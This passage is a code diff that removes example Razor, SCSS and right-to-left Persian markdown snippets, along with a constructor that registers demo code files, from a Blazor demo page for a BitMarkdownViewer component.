-    MarkdownFlavor.Basic => ""Basic CommonMark only - reference links and character references still work, but tables, strikethrough, task lists, footnotes, alerts, emoji and bare URLs render as plain text."",
-    MarkdownFlavor.GitHub => ""The GitHub flavors: pipe tables, ~~strikethrough~~, task lists, autolink literals, footnotes and alerts."",
-    _ => ""Advanced: the GitHub flavors plus front matter, the emphasis extras, containers, definition lists, abbreviations, figures, :sparkles: emoji and automatic heading ids.""
-};";
-
-    private readonly string example26RazorCode = @"
-<BitMarkdownViewer Style=""border-inline-start:0.25rem solid var(--bit-clr-pri);padding-inline-start:1rem""
-                   Markdown=""@(""A **styled** viewer, set apart with an inline `Style`."")"" />
-
-<BitMarkdownViewer Class=""custom-mdv""
-                   Markdown=""@(""### A classy viewer\n\nEvery `code` span and heading inside it is restyled from the page's own stylesheet."")"" />";
-    private readonly string example26ScssCode = @"
-::deep .custom-mdv {
-    padding: 1rem;
-    border-radius: 0.5rem;
-    background: $bit-color-background-secondary;
-
-    h3 {
-        margin-top: 0;
-        color: $bit-color-primary;
-    }
-
-    code {
-        color: $bit-color-primary-dark;
-        background: $bit-color-background-primary-light;
-    }
-}";
-    private readonly DemoCodeFile[] example26CodeFiles;
-
-    private readonly string example27RazorCode = @"
-<BitMarkdownViewer Dir=""BitDir.Rtl"" Markdown=""@rtlMarkdown"" Pipeline=""BitMarkdownPipelines.Advanced"" />";
-    private readonly string example27CsharpCode = @"
-private readonly string rtlMarkdown = @""# نمایشگر مارک‌داون
-
-متن **درشت** و *مورب* در کنار `کد درون‌خطی`.
-
-> [!NOTE]
-> نوار رنگی این کادر با جهت متن جابه‌جا می‌شود.
-
-- مورد اول
-- مورد دوم
-    - مورد تودرتو
-
-| ستون | مقدار |
-|:-----|------:|
-| یک   |     ۱ |
-| دو   |     ۲ |
-"";";
-
-    public BitMarkdownViewerDemo()
-    {
-        example12CodeFiles =
-        [
-            new("KatexTypesetter.razor", example12TypesetterCode),
-            new("typeset-math.js", example12ScriptCode),
-        ];
-
-        example20CodeFiles =
-        [
-            new("BitMarkdownViewerDemo.razor.scss", example20ScssCode),
-        ];
-
-        example26CodeFiles =
-        [
-            new("BitMarkdownViewerDemo.razor.scss", example26ScssCode),
-        ];
-    }
+- English item
+";
 }
